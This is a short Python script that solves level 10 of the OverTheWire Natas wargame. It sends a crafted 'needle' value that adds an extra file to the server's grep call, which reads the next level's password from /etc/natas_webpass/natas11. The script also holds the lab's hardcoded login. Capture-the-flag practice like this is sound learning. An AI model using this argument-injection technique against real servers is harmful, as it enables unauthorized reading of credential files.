import requests
import re


username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
url = "http://%s.natas.labs.overthewire.org/"  % username
source = "index-source.html"

session = requests.Session()
response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

cmd = "[A-Za-z0-9] /etc/natas_webpass/natas11"
response = session.post(url,auth=(username,password),data={"needle":cmd})
print(response.text)
print("="*50)

# Just Code Printing
code = re.findall(r"[A-Za-z0-9]{32}", response.text)[1]
print("The code for the next level is: " + code)